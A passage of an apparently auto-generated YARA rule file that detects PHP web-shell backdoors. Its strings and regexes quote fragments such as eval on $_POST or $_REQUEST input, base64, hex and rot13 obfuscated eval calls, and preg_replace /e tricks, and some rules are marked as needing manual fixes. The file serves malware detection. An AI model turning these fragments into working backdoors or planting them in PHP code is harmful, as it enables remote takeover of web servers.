    condition:
        $ps0
}

private rule PR01933 : trigger
{
    strings:
        $ps0 = "=\"\\x"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_183 : backdoor
{
    strings:
        $trigger = "(null, $"
        $php_backdoor_eval_POST_183_r0 = /\$[\w]+[\s]*=[\s]*\".x...x[^;]+;[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\[[\d]\][\s]*\.[\s]*\$[\w]+\[[\d]+[^;]+;[\s]*\$[\w]+[\s]*=[\s]*\$\{\$[^;]+;[\s]*if[\s]*\([\s]*isset[^\}]+\$[\w]+\(\);[\s]*\}[\s]*/
    condition:
        $trigger and PR01930 and PR01931 and PR01932 and PR00397 and PR01933 and $php_backdoor_eval_POST_183_r0
}

private rule PR01934 : trigger
{
    strings:
        $ps0 = "); exit(0); }"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_184 : backdoor
{
    strings:
        $trigger = "if (isset($_POST[\"ata\"])) { $"
    condition:
        $trigger and PR01934 and PR00029 and PR01422
}

rule php_backdoor_eval_POST_185 : backdoor
{
    strings:
        $trigger = "(base64_decode(@$_POST["
    condition:
        $trigger and PR00732 and PR01746
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_186 : backdoor
{
    strings:
        $trigger = "eva"
        $php_backdoor_eval_POST_186_r0 = /if\s*\(\s*isset\s*\(\s*\$\s*\{\s*\$\w+\s*\}\s*\[\s*'\w+'\s*\]\s*\)\s*\)\s*\{\s*eval(\s*\(\s*\$\w+)?\s*\(\s*\$\{/
    condition:
        $trigger and $php_backdoor_eval_POST_186_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_187 : backdoor
{
    strings:
        $trigger = "register_shutdown_function"
        $php_backdoor_eval_POST_187_r0 = /@[\s]*register_shutdown_function[\s]*\([\s]*\$[{\"\s]*_(COOKIE|POST)/
    condition:
        $trigger and $php_backdoor_eval_POST_187_r0
}

// MANUAL FIX NECESSARY
private rule PR01935 : trigger
{
    strings:
        $ps0 = "])];}if($"
    condition:
        $ps0
}

private rule PR01936 : trigger
{
    strings:
        $ps0 = "=$$"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_189 : backdoor
{
    strings:
        $trigger = "));$"
        $php_backdoor_eval_POST_189_r0 = /\$[\w]{20,}=\"(\\x5f|_)(\\x50|P)(\\x4f|O)(\\x53|S)(\\x54|T)\";\$[\w]{20,}=\$\$[\w]{20,};if[^>]+@\$[\w]{20,}\(\);}}}/
    condition:
        $trigger and PR01935 and PR01936 and $php_backdoor_eval_POST_189_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_191 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_eval_POST_191_r0 = /\$[\w]+[\s]*=[\s]*\$_POST;[\s]*(\$[\w]+[\s]*=[\s]*\$[\w]+\[[\w]+\];[\s]*){2,}if[\s]*\([\s]*\$[\w]+\)[\s]*\{[\s]*\$[\w]+\(\$[\w]+\);[\s]*\}[\s]*/
    condition:
        $trigger and $php_backdoor_eval_POST_191_r0
}

rule php_backdoor_eval_POST_195 : backdoor
{
    strings:
        $trigger = "(); eval($"
    condition:
        $trigger and PR00507
}

private rule PR01937 : trigger
{
    strings:
        $ps0 = "$dolly_css[]=$_POST;"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_196 : backdoor
{
    strings:
        $trigger = "$dolly['footer'] = $dolly['footer']($dolly['themes'])[$dolly['name']];"
    condition:
        $trigger and PR01937 and PR00397
}

rule php_backdoor_eval_POST_198 : backdoor
{
    strings:
        $trigger = "aWYoIGlzc2V0CiggJF9QT1NUW3"
    condition:
        $trigger and PR01925
}

rule php_backdoor_eval_POST_199 : backdoor
{
    strings:
        $trigger = "WYKICgKIGlzc2V0KCRfUE9TVFtwcm9kdWN0X2lkXSkgCSYmICAgbWQ1KCAkX1BPU1RbcHJvZHVjdF9pZF0"
    condition:
        $trigger and PR01925
}

rule php_backdoor_eval_preg_replace_002 : backdoor
{
    strings:
        $trigger = "preg_replace(\"/(.*)/e\", stripslashes(@$_POST["
    condition:
        $trigger
}

private rule PR01938 : trigger
{
    strings:
        $ps0 = "${$"
    condition:
        $ps0
}

rule php_backdoor_eval_preg_replace_003 : backdoor
{
    strings:
        $trigger = "])) preg_replace("
    condition:
        $trigger and PR01938
}

private rule PR01939 : trigger
{
    strings:
        $ps0 = "esi\",\"\\x65\\x76\\x61\\x6C\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65\\x28"
    condition:
        $ps0
}

rule php_backdoor_eval_preg_replace_004 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR01939
}

private rule PR01940 : trigger
{
    strings:
        $ps0 = ".*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65\\x28"
    condition:
        $ps0
}

rule php_backdoor_eval_preg_replace_004_02 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01940 and PR00397
}

rule php_backdoor_eval_preg_replace_005 : backdoor
{
    strings:
        $trigger = "\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x75\\x6E\\x63\\x6F\\x6D\\x70\\x72\\x65\\x73\\x73\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65\\x28\\x69\\x6D\\x70\\x6C\\x6F\\x64\\x65\\x28\\x22\\x22"
    condition:
        $trigger and PR01179
}

rule php_backdoor_eval_REQUEST_001 : backdoor
{
    strings:
        $trigger = "eval(stripslashes(\\$_REQUEST["
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_001_02 : backdoor
{
    strings:
        $trigger = "; exit(); } if(isset($_REQUEST"
    condition:
        $trigger and PR00029
}

private rule PR01941 : trigger
{
    strings:
        $ps0 = "*/eval/*"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_001_03 : backdoor
{
    strings:
        $trigger = "*/base64_decode/*"
    condition:
        $trigger and PR01941
}

rule php_backdoor_eval_REQUEST_001_04 : backdoor
{
    strings:
        $trigger = "str_rot13('cert_ercynpr')"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_001_05 : backdoor
{
    strings:
        $trigger = "eval(stripslashes($_REQUEST["
        $php_backdoor_eval_REQUEST_001_05_r0 = /<\?[^\n]+eval/
        $php_backdoor_eval_REQUEST_001_05_r1 = /<\?[^>]+@?eval.stripslashes.\$_REQUEST[^;]+;[^\n]*\?>/
    condition:
        $trigger and $php_backdoor_eval_REQUEST_001_05_r0 and $php_backdoor_eval_REQUEST_001_05_r1
}

private rule PR01942 : trigger
{
    strings:
        $ps0 = "*/stripslashes/*"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_001_06 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01942
}

private rule PR01943 : trigger
{
    strings:
        $ps0 = "eval(stripslashes($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_001_07 : backdoor
{
    strings:
        $trigger = "if(isset($_REQUEST[\""
    condition:
        $trigger and PR01943
}

private rule PR01944 : trigger
{
    strings:
        $ps0 = "(isset($_REQUEST['asc']))"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_001_08 : backdoor
{
    strings:
        $trigger = "eval(stripslashes($_REQUEST["
    condition:
        $trigger and PR01944
}

private rule PR01945 : trigger
{
    strings:
        $ps0 = "['pas']"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_001_09 : backdoor
{
    strings:
        $trigger = "str_rot13('cert_ercynpr"
    condition:
        $trigger and PR01945
}

rule php_backdoor_eval_REQUEST_003_02 : backdoor
{
    strings:
        $trigger = ");}if ($eval){eval($eval);}"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_005 : backdoor
{
    strings:
        $trigger = "case \"20\": echo \"Error 403\";exit;break;}}"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_006 : backdoor
{
    strings:
        $trigger = "$maindomain = \"desoupline.com\";"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_007 : backdoor
{
    strings:
        $trigger = "]) ($_=@$_REQUEST[q]).@$_($_REQUEST["
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_010 : backdoor
{
    strings:
        $trigger = "eval($a($_REQUEST[sam]));"
    condition:
        $trigger
}

private rule PR01946 : trigger
{
    strings:
        $ps0 = "$post_var = \"req\";"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_011 : backdoor
{
    strings:
        $trigger = "REQUEST"
    condition:
        $trigger and PR01946 and PR00029
}

rule php_backdoor_eval_REQUEST_012 : backdoor
{
    strings:
        $trigger = "\"]($_REQUEST[\"c\"]);"
    condition:
        $trigger and PR01379
}

private rule PR01947 : trigger
{
    strings:
        $ps0 = "= strrev($_REQUEST["
    condition:
        $ps0
}

private rule PR01948 : trigger
{
    strings:
        $ps0 = "if (!empty($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_013 : backdoor
{
    strings:
        $trigger = "('', @$"
    condition:
        $trigger and PR01947 and PR01948
}

private rule PR01949 : trigger
{
    strings:
        $ps0 = "$document->addCustomTag(eval($myvar));"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_014 : backdoor
{
    strings:
        $trigger = "REQUEST"
    condition:
        $trigger and PR01949
}

rule php_backdoor_eval_REQUEST_015 : backdoor
{
    strings:
        $trigger = "/e\", \"ev\".\"al('\".$_REQUEST"
    condition:
        $trigger and PR01818
}

rule php_backdoor_eval_REQUEST_016 : backdoor
{
    strings:
        $trigger = "eval(stripslashes(@$_REQUEST"
    condition:
        $trigger
}

private rule PR01950 : trigger
{
    strings:
        $ps0 = "@ini_set('display_errors', NULL);"
    condition:
        $ps0
}

private rule PR01951 : trigger
{
    strings:
        $ps0 = "html_entity_decode"
    condition:
        $ps0
}

private rule PR01952 : trigger
{
    strings:
        $ps0 = "unlink(__FILE__);"
    condition:
        $ps0
}

private rule PR01953 : trigger
{
    strings:
        $ps0 = "@ini_set('log_errors',NULL);"
    condition:
        $ps0
}

private rule PR01954 : trigger
{
    strings:
        $ps0 = "if(empty($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_017 : backdoor
{
    strings:
        $trigger = "array_map"
    condition:
        $trigger and PR01950 and PR01951 and PR01952 and PR00029 and PR01953 and PR01954
}

rule php_backdoor_eval_REQUEST_018 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('y0zTyCwuTi3RUIkPcg0MdQ"
    condition:
        $trigger
}

private rule PR01955 : trigger
{
    strings:
        $ps0 = "isset($_REQUEST['php_code']))"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_019 : backdoor
{
    strings:
        $trigger = "eval($_REQUEST["
    condition:
        $trigger and PR00732 and PR01955
}

private rule PR01956 : trigger
{
    strings:
        $ps0 = "}!=${"
    condition:
        $ps0
}

private rule PR01957 : trigger
{
    strings:
        $ps0 = "\"})?@${\""
    condition:
        $ps0
}

private rule PR01958 : trigger
{
    strings:
        $ps0 = "(@${\""
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_020 : backdoor
{
    strings:
        $trigger = "=${'_REQUEST'}"
    condition:
        $trigger and PR01956 and PR01957 and PR01958
}

private rule PR01959 : trigger
{
    strings:
        $ps0 = "@arsort($alphabet);"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_021 : backdoor
{
    strings:
        $trigger = "@$value($array_name($_REQUEST[\"array\"]));"
    condition:
        $trigger and PR01959 and PR01746
}

rule php_backdoor_eval_REQUEST_022 : backdoor
{
    strings:
        $trigger = "if(!isset($_REQUEST['gnu'])||!isset($_REQUEST"
    condition:
        $trigger and PR00029
}

rule php_backdoor_eval_REQUEST_023 : backdoor
{
    strings:
        $trigger = "@eval(@stripslashes(@$_REQUEST["
    condition:
        $trigger
}

private rule PR01960 : trigger
{
    strings:
        $ps0 = "strrev(\"noi\".\"tcnuf"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_025 : backdoor
{
    strings:
        $trigger = "$_REQUEST['sort']"
    condition:
        $trigger and PR01179 and PR01960
}

private rule PR01961 : trigger
{
    strings:
        $ps0 = "$string ="
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_025_02 : backdoor
{
    strings:
        $trigger = "strrev(\"noi\".\"tcnuf"
    condition:
        $trigger and PR01179 and PR01961
}

rule php_backdoor_eval_REQUEST_025_03 : backdoor
{
    strings:
        $trigger = "if(isset($_REQUEST['sort']))"
    condition:
        $trigger and PR01179 and PR01960
}

// MANUAL FIX NECESSARY
private rule PR01962 : trigger
{
    strings:
        $ps0 = "foreach"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_025_04 : backdoor
{
    strings:
        $trigger = ".="
        $php_backdoor_eval_REQUEST_025_04_r0 = /foreach[\s]*\([\s]*(\[|array\()[\d]+,/
        $php_backdoor_eval_REQUEST_025_04_r1 = /\.[\s]*['\"]c['\"][\s]*\./
        $php_backdoor_eval_REQUEST_025_04_r2 = /\.[\s]*['\"]f['\"][\s]*\./
        $php_backdoor_eval_REQUEST_025_04_r3 = /\.[\s]*['\"]t['\"][\s]*\./
        $php_backdoor_eval_REQUEST_025_04_r4 = /\$[\w]+[\s]*=[\s]*\"[^\"]{10,}\";[^{]+foreach[\s]*\([\s]*(\[|array\()[\d]+,[\s]*[\d]+[^\{]+\{[\s]*\$[\w]+[\s]*\.=[\s]*\$[\w]+\[\$[\w]\];[\s]*\}[^}]+foreach[\s]*\([\s]*(\[|array\()[\d]+[^}]+\}[^\>]+\$[\w]+[\s]*=[\s]*\$[\w]+\(['\"][^;]+\);[\s]*\$[\w]+\(\);[\s]*(exit[^;]*;[\s]*)?(\}[\s]*)?/
    condition:
        $trigger and PR01692 and PR01962 and $php_backdoor_eval_REQUEST_025_04_r0 and $php_backdoor_eval_REQUEST_025_04_r1 and $php_backdoor_eval_REQUEST_025_04_r2 and $php_backdoor_eval_REQUEST_025_04_r3 and $php_backdoor_eval_REQUEST_025_04_r4
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_025_05 : backdoor
{
    strings:
        $trigger = ".="
        $php_backdoor_eval_REQUEST_025_05_r0 = /foreach[\s]*\([\s]*(\[|array\()[\d]+,/
        $php_backdoor_eval_REQUEST_025_05_r1 = /\.[\s]*['\"]c['\"][\s]*\./
        $php_backdoor_eval_REQUEST_025_05_r2 = /\.[\s]*['\"]f['\"][\s]*\./
        $php_backdoor_eval_REQUEST_025_05_r3 = /\.[\s]*['\"]t['\"][\s]*\./
        $php_backdoor_eval_REQUEST_025_05_r4 = /\^[\s]*\$/
        $php_backdoor_eval_REQUEST_025_05_r5 = /<[\s]*strlen\(\$/
    condition:
        $trigger and PR01692 and PR01962 and $php_backdoor_eval_REQUEST_025_05_r0 and $php_backdoor_eval_REQUEST_025_05_r1 and $php_backdoor_eval_REQUEST_025_05_r2 and $php_backdoor_eval_REQUEST_025_05_r3 and $php_backdoor_eval_REQUEST_025_05_r4 and $php_backdoor_eval_REQUEST_025_05_r5
}

private rule PR01963 : trigger
{
    strings:
        $ps0 = "<?php eval(base64_decode('Ly"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_026 : backdoor
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR01963
}

private rule PR01964 : trigger
{
    strings:
        $ps0 = "'//e'"
    condition:
        $ps0
}

private rule PR01965 : trigger
{
    strings:
        $ps0 = "${\"_REQ"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_028 : backdoor
{
    strings:
        $trigger = "*/if/*"
    condition:
        $trigger and PR01964 and PR01965 and PR01746
}

private rule PR01966 : trigger
{
    strings:
        $ps0 = "eval(base64_decode($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_030 : backdoor
{
    strings:
        $trigger = "&& md5($_REQUEST["
    condition:
        $trigger and PR01966
}

rule php_backdoor_eval_REQUEST_030_02 : backdoor
{
    strings:
        $trigger = "$_SERVER[\"REQUEST_URI\"])){echo\"1\";exit;}"
    condition:
        $trigger
}

private rule PR01967 : trigger
{
    strings:
        $ps0 = "$_REQUEST['coco'];"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_032 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR00029 and PR01967
}

private rule PR01968 : trigger
{
    strings:
        $ps0 = "isset("
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_033 : backdoor
{
    strings:
        $trigger = "'])){/*"
    condition:
        $trigger and PR00029 and PR01623 and PR01788 and PR01968
}

private rule PR01969 : trigger
{
    strings:
        $ps0 = "set_time_limit(0);error_reporting(NULL);"
    condition:
        $ps0
}

private rule PR01970 : trigger
{
    strings:
        $ps0 = "else{echo '<!DOCTYPE"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_035 : backdoor
{
    strings:
        $trigger = "])!=NULL){eval(base64_decode($_REQUEST["
    condition:
        $trigger and PR01969 and PR01970
}

private rule PR01971 : trigger
{
    strings:
        $ps0 = "'])/*"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_036 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR00029 and PR01971 and PR01623 and PR01788
}

rule php_backdoor_eval_REQUEST_037 : backdoor
{
    strings:
        $trigger = "]); echo 'OK';"
    condition:
        $trigger and PR00029 and PR01623
}

rule php_backdoor_eval_REQUEST_039 : backdoor
{
    strings:
        $trigger = "])){die(pi()*"
    condition:
        $trigger and PR00029 and PR01623 and PR01968
}

private rule PR01972 : trigger
{
    strings:
        $ps0 = "$_=new Echoes;exit($_->_($Data,$Key,$md5));"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_040 : backdoor
{
    strings:
        $trigger = "pack("
    condition:
        $trigger and PR01972
}

rule php_backdoor_eval_REQUEST_041 : backdoor
{
    strings:
        $trigger = "<?php extract($_REQUEST) && @$"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_042 : backdoor
{
    strings:
        $trigger = "} else {echo base64_decode("
    condition:
        $trigger and PR01398
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_043 : backdoor
{
    strings:
        $trigger = "*/"
        $php_backdoor_eval_REQUEST_043_r0 = /\^['\"]/
        $php_backdoor_eval_REQUEST_043_r1 = /\$[\w]+[\s]*=[\s]*'[^']+'[\s]*\^[\s]*'[^']+';[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\('',/
    condition:
        $trigger and $php_backdoor_eval_REQUEST_043_r0 and $php_backdoor_eval_REQUEST_043_r1
}

rule php_backdoor_eval_REQUEST_044 : backdoor
{
    strings:
        $trigger = "eval(str_rot13(base64_decode($"
    condition:
        $trigger and PR00391
}

private rule PR01973 : trigger
{
    strings:
        $ps0 = "]('$_',$_REQUEST['FILE'].'($_);'); $_FILE(stripslashes($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_045 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01973
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_046 : backdoor
{
    strings:
        $trigger = "$_REQUEST;"
        $php_backdoor_eval_REQUEST_046_r0 = /\$[\w]+[\s]*=[\s]*\$_REQUEST;[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\[[\w]+\];[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\[[\w]+\];[\s]*if\(\$[\w]+\)[\s]*\{[\s]*\$[\w]+\(\$[\w]+\);[\s]*\}/
    condition:
        $trigger and $php_backdoor_eval_REQUEST_046_r0
}

private rule PR01974 : trigger
{
    strings:
        $ps0 = "@array_diff_ukey(@array((string)@$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_047 : backdoor
{
    strings:
        $trigger = "@array((string)stripslashes(@$_REQUEST["
    condition:
        $trigger and PR01974
}

private rule PR01975 : trigger
{
    strings:
        $ps0 = "<?php error_reporting(0);"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_048 : backdoor
{
    strings:
        $trigger = "GIF89a"
    condition:
        $trigger and PR01975
}

private rule PR01976 : trigger
{
    strings:
        $ps0 = "));exit;}(@copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_049 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR01976 and PR01398
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_050 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_eval_REQUEST_050_r0 = /if[\s]*\(isset[\s]*\(\$_REQUEST\[.[\w]+.\]\)[\s]*&&[\s]*md5[\s]*\([\s]*\$_REQUEST\[.[\w]+.\]\)[\s]*==[\s]*.[\w]{20,}.[\s]*&&[\s]*isset[\s]*\([\s]*\$_REQUEST\[.[\w]+.\]\)\)[\s]*eval/
    condition:
        $trigger and PR00397 and $php_backdoor_eval_REQUEST_050_r0
}

private rule PR01977 : trigger
{
    strings:
        $ps0 = "if (!class_exists('ecode_slicer_du"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_051 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR00029 and PR01623 and PR01977
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_052 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_eval_REQUEST_052_r0 = /\$[\w]+[\s]*=[\s]*\"[^\"]{300,}\";[\s]*\$[\w]+[\s]*=[\s]*'[^']{50,}';[\s]*(\$[\w]+[\s]*=[\s]*\$[\w]+\[[\d]+[^;]+;[\s]*){5,}\$[\w]+[\s]*=[\s]*\$[\w]+\('',[\s]*\$[\w]+\([^,]+,[\s]*\$[\w]+\(\$[\w]+[^;]+\);[\s]*\$[\w]+\(\$[\w]+,[^;]+\);/
    condition:
        $trigger and $php_backdoor_eval_REQUEST_052_r0
}

private rule PR01978 : trigger
{
    strings:
        $ps0 = "substr(strrev(md5(strrev(sha1($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_053 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR00029 and PR01978 and PR01788
}

private rule PR01979 : trigger
{
    strings:
        $ps0 = "call_user_func(function($"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_054 : backdoor
{
    strings:
        $trigger = "REQUEST"
    condition:
        $trigger and PR01979 and PR00029
}

private rule PR01980 : trigger
{
    strings:
        $ps0 = "if(strcmp(md5("
    condition:
        $ps0
}

private rule PR01981 : trigger
{
    strings:
        $ps0 = "$output=$res(substr($_REQUEST["
    condition:
        $ps0
}

private rule PR01982 : trigger
{
    strings:
        $ps0 = "elseif(@file_put_contents($"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_055 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01980 and PR01981 and PR01982
}

rule php_backdoor_eval_REQUEST_056 : backdoor
{
    strings:
        $trigger = "CjaVWqXOsmAQlfK8q+QiJl5iVhSipDyLh8YXyvpIolv7v"
    condition:
        $trigger and PR00029
}

private rule PR01983 : trigger
{
    strings:
        $ps0 = "<?php @'$"
    condition:
        $ps0
}

private rule PR01984 : trigger
{
    strings:
        $ps0 = "]=implode(\"\",array_reverse($"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_057 : backdoor
{
    strings:
        $trigger = ";@eval($_REQUEST[$"
    condition:
        $trigger and PR01983 and PR01984 and PR01962
}

private rule PR01985 : trigger
{
    strings:
        $ps0 = "dZBfT8IwFMWf2afoA0kHMfwZMCBIhOBieBkyMJoY0nTbZa3p2qUtJkT97m7zQTT6dvM795ze0+ubghXO"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_058 : backdoor
{
    strings:
        $trigger = ")));');"
    condition:
        $trigger and PR01985
}

rule php_backdoor_eval_REQUEST_059 : backdoor
{
    strings:
        $trigger = "$b($_REQUEST['c'], $a($_REQUEST['d']));"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_061 : backdoor
{
    strings:
        $trigger = "error_reporting(0); eval($_REQUEST["
    condition:
        $trigger
}

private rule PR01986 : trigger
{
    strings:
        $ps0 = "\";error_reporting(0);$"
    condition:
        $ps0
}

private rule PR01987 : trigger
{
    strings:
        $ps0 = "]}=@mail(${$"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_062 : backdoor
{
    strings:
        $trigger = "]},\"w\");}else{};}if(isset($_POST[\""
    condition:
        $trigger and PR00355 and PR01986 and PR01987 and PR00357 and PR01431
}

rule php_backdoor_eval_REQUEST_063 : backdoor
{
    strings:
        $trigger = "error_reporting(0); foreach($_REQUEST"
    condition:
        $trigger and PR00029
}

private rule PR01988 : trigger
{
    strings:
        $ps0 = ">'.$_SESSION['server']."
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_064 : backdoor
{
    strings:
        $trigger = "''.base64_decode($a).'';"
    condition:
        $trigger and PR00029 and PR01742 and PR01988
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_065 : backdoor
{
    strings:
        $trigger = "eval(stripslashes($_REQUEST["
        $php_backdoor_eval_REQUEST_065_r0 = /if\(isset\(\$_REQUEST\[.[\w]+.\]\)\)eval\(stripslashes\(\$_REQUEST\[.[\w]+.\]\)\);/
    condition:
        $trigger and $php_backdoor_eval_REQUEST_065_r0
}

rule php_backdoor_eval_REQUEST_066 : backdoor
{
    strings:
        $trigger = "exit(eval($_REQUEST["
    condition:
        $trigger
}

private rule PR01989 : trigger
{
    strings:
        $ps0 = "exit(eval($"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_066_02 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR01989
}

private rule PR01990 : trigger
{
    strings:
        $ps0 = "pTv7c5s6s/8KdTkFzi"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_067 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01990
}

private rule PR01991 : trigger
{
    strings:
        $ps0 = "= \"base\". \"64_dec\".\"ode\";"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_068 : backdoor
{
    strings:
        $trigger = "\\Magento\\Framework\\Url\\DecoderInterface $urlDecoder"
    condition:
        $trigger and PR00029 and PR01991
}

rule php_backdoor_eval_REQUEST_069 : backdoor
{
    strings:
        $trigger = "elseif(@file_put_contents($header_two, @file_get_contents(__FILE__)))"
    condition:
        $trigger and PR00029 and PR01623 and PR01968
}

// MANUAL FIX NECESSARY
private rule PR01992 : trigger
{
    strings:
        $ps0 = "eval($i);"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_070 : backdoor
{
    strings:
        $trigger = "foreach($_REQUEST"
        $php_backdoor_eval_REQUEST_070_r0 = /foreach\(\$_REQUEST[\s]*as[\s]*\$i[\s]*\)[\s]*eval\([\s]*\$i[\s]*\);[\s]*/
    condition:
        $trigger and PR01992 and $php_backdoor_eval_REQUEST_070_r0
}

rule php_backdoor_eval_REQUEST_071 : backdoor
{
    strings:
        $trigger = "if(strcmp(md5("
    condition:
        $trigger and PR01350
}

// MANUAL FIX NECESSARY
private rule PR01993 : trigger
{
    strings:
        $ps0 = "<?php /*"
    condition:
        $ps0
}

private rule PR01994 : trigger
{
    strings:
        $ps0 = "\";eval/*"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_072 : backdoor
{
    strings:
        $trigger = "='b"
        $php_backdoor_eval_REQUEST_072_r0 = /\/\*[^\n]+\*\/\.\"[^\n]+eval\/\*[^\n]+;\/\*[^\n]+\*\/[\s]*/
    condition:
        $trigger and PR01993 and PR01994 and PR01411 and $php_backdoor_eval_REQUEST_072_r0
}

rule php_backdoor_eval_REQUEST_073 : backdoor
{
    strings:
        $trigger = "write_check_class.txt',$file_name.':::"
    condition:
        $trigger and PR00435
}

private rule PR01995 : trigger
{
    strings:
        $ps0 = "${\"_REQUEST\"}"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_074 : backdoor
{
    strings:
        $trigger = "@!(${\"ip\"}["
    condition:
        $trigger and PR01995
}

private rule PR01996 : trigger
{
    strings:
        $ps0 = "array_merge($_REQUEST, $_COOKIE, $_SERVER); if ($i = isset($i["
    condition:
        $ps0
}

private rule PR01997 : trigger
{
    strings:
        $ps0 = "array( 'decode' => 'base'.'64',"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_076 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR01996 and PR01997
}

rule php_backdoor_eval_REQUEST_077 : backdoor
{
    strings:
        $trigger = "eval($str.$key.$str);"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_078 : backdoor
{
    strings:
        $trigger = "if(!empty($_REQUEST[\"args\"])){@eval(base64_decode"
    condition:
        $trigger
}

rule php_backdoor_eval_REQUEST_079 : backdoor
{
    strings:
        $trigger = "extract($_REQUEST)&&@$internal(stripslashes"
    condition:
        $trigger
}

private rule PR01998 : trigger
{
    strings:
        $ps0 = "(preg_split(\"//\","
    condition:
        $ps0
}

private rule PR01999 : trigger
{
    strings:
        $ps0 = "preg_match_all(\"([A-z0-9+\\\\/]{1,4})\","
    condition:
        $ps0
}

private rule PR02000 : trigger
{
    strings:
        $ps0 = "implode('', array_map("
    condition:
        $ps0
}

private rule PR02001 : trigger
{
    strings:
        $ps0 = "str"
    condition:
        $ps0
}

